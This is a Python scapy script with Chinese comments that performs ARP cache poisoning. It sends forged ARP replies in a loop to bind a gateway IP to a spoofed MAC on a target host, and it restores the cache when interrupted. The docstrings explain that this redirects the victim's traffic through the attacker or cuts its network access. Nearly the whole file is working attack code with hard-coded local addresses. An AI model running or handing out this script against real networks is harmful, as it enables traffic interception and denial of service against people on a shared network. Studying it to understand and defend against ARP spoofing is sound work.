# ---------- encoding：UTF-8 ------------
# author:liu     time:2021/3/5
from scapy.all import *
import time
from scapy.layers.l2 import ARP, getmacbyip

"""
构造一个以太网数据包通常需要指定目标和源MAC地址，如果不指定，默认发出的就是广播包，
构造ARP需要我们注意的有5个参数：

l  op。取值为1或者2，代表ARP请求或者响应包。

l  hwsrc。发送方Mac地址。

l  psrc。发送方IP地址。

l  hwdst。目标Mac地址。

l  pdst。目标IP地址。

"""
def restore_target(getway_ip, getway_mac, target_ip, target_mac):
    print("[*****]恢复ARP缓冲[*****]")

    # send(ARP(op=2, psrc=getway_mac, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=getway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=getway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac))


def create_arp_station(getway_mac, getway_ip, target_mac, target_ip):
    """
    一般都是双向欺骗；

    生成arp响应包，伪造网关欺骗目标主机
    将攻击主机的mac地址与网关的ip地址进行绑定
    目标主机发送的数据都会被发往攻击主机，没有回复则会造成断网攻击

    生成arp响应包，伪造目标主机欺骗网关
    将攻击主机的Mac地址与目标主机的ip地址进行绑定
    网关发送的数据都会被发往攻击主机

    """
    poison_target = ARP()   # 欺骗目标主机，本机就是网关

    poison_target.op = 2
    poison_target.hwsrc = getway_mac  # 伪造Mac地址，默认本机
    poison_target.psrc = getway_ip  # 网关IP地址

    poison_target.hwdst = target_mac
    poison_target.pdst = target_ip


    poison_getway = ARP()   # 欺骗网关我就是目标主机,网关发往目标主机的数据发抖发送到攻击主机上
    poison_getway.op = 2
    # poison_getway.hwsrc = # 接收数据的Mac地址，默认本机，可以忽略
    poison_getway.psrc = target_ip

    poison_getway.pdst = getway_ip
    poison_getway.hwdst =  "44:6a:2e:48:3d:07"  # 44:6a:2e:48:3d:07真实Mac地址


    print("[*****]正在进行ARP投毒,{ctrl-c进行停止}[*****]")

    while True:
        try:
            send(poison_target)  # 欺骗目标主机

            time.sleep(2)

        except KeyboardInterrupt:
            restore_target(getway_ip, getway_mac, target_ip, target_mac)
            break

    print("[*****]ARP投毒结束[*****]")


def main():
    # 网关ip地址
    getway_ip = "10.12.11.2"

    # 伪造的Mac地址
    # getway_mac = "00:0c:29:8c:3f:16"    # 这个Mac地址为攻击主机的Mac地址，也可以伪造成其他

    getway_mac = "00:11:22:33:44:55"

    # 目标ip
    target_ip = "10.12.11.78"
    # 目标Mac地址
    target_mac = "70:8B:CD:17:3A:39"
    create_arp_station(getway_mac, getway_ip, target_mac, target_ip)


if __name__ == '__main__':
    main()

